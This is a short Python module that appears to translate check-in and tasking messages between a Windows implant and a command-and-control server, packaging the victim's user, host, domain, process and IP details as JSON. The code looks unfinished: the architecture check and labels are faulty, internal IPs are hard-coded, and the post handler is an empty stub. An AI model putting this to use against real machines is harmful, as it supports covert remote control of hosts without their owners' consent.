from Translator.Utils import *

import ipaddress

def CheckinC2( Data ) -> dict:
    Psr = Parser( Data, len( Data ) );

    UUID   = Psr.Pad( 36 );
    OsName = "Windows";
    OsArch = Psr.Pad( 1 );

    if OsArch == 0x64:
        OsArch = "x64";
    elif OsArch == 0x86:
        OsArch = "0x86";

    UserName  = Psr.Str();
    HostName  = Psr.Str();
    Netbios   = Psr.Str();
    ProcessID = Psr.Int32();
    ImagePath = Psr.Str();
    ExternIp  = Psr.Str();

    InternIp = ["0.0.0.0"];

    JsonData = {
        "action": "checkin",
        "ips": InternIp,
        "os": OsName,
        "user": UserName,
        "host": HostName,
        "domain": Netbios,
        "process_name":ImagePath,
        "pid": ProcessID,
        "uuid": UUID.decode('cp850'),
        "architecture": OsArch,
        "externalIP": ExternIp,
    };

    return JsonData;

def GetTaskingC2( Data ):
    print( "[GET_TASKING]" );
    numTasks = int.from_bytes( Data[0:4] );
    DataJson = { "action": "get_tasking", "tasking_size": numTasks };
    print( f"Showing Jsong {DataJson}" );
    return DataJson

def PostC2( Data ):
    return;